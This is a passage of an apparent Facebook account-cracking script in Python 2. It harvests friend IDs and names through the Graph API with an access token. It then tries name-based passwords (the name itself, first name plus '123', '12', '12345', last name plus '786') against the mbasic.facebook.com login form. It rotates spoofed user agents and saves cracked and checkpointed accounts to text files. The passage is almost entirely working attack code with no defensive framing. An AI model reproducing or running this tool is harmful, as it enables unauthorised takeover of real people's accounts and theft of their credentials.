    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    os.system('rm -rf newlinks.txt')
    os.system('cat jok.txt | grep '+l1+' >> newlinks.txt')
    os.system('cat jok.txt | grep '+l2+' >> newlinks.txt')
    os.system('rm -rf kk.txt')
    os.system('rm -rf jok.txt')
    os.system('clear')
    print logo
    print ""
    try:
        for line in open("newlinks.txt",'r').readlines():
            idx.append(line.strip())
    except:
        fb_menu()
    print "[!] total ids : "+str(len(idx))
    os.system('echo " -----------------------------------"| lolcat')
    print "    Cracking Start Please Wait .."
    print "   Use Flight Mod For Speed Up"
    os.system('echo " -----------------------------------"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        myagents=random.choice(["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.8 (KHTML, like Gecko) Version/8.0.3 Safari/600.4.8", "Mozilla/5.0 (iPad; CPU OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12"])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[SHANI-OK] "+uid + " | " + pass1
                ok=open('SHANI-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;91m[SHANI-CP] "+uid + " | " + pass1
                    cp=open('SHSNI-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = first+"123"
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[SHANI-OK] "+uid + " | " + pass2
                        ok=open('SHANI-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[SHANI-CP] "+uid + " | " + pass2
                            cp=open('SHANI-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = first+"12"
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[SHANI-OK] "+uid + " | " + pass3
                                ok=open('SHANI-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[SHANI-CP] "+uid + " | " + pass3
                                    cp=open('SHANI-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = first+"12345"
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[SHANI-OK] "+uid + " | " + pass4
                                        ok=open('SHANI-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[SHANI-CP] "+uid + " | " + pass4
                                            cp=open('SHANI-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = last+"786"
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[SHANI-OK] "+uid + " | " + pass5
                                                ok=open('SHANI-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[SHANI-CP] "+uid + " | " + pass5
                                                    cp=open('SHANI-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
			
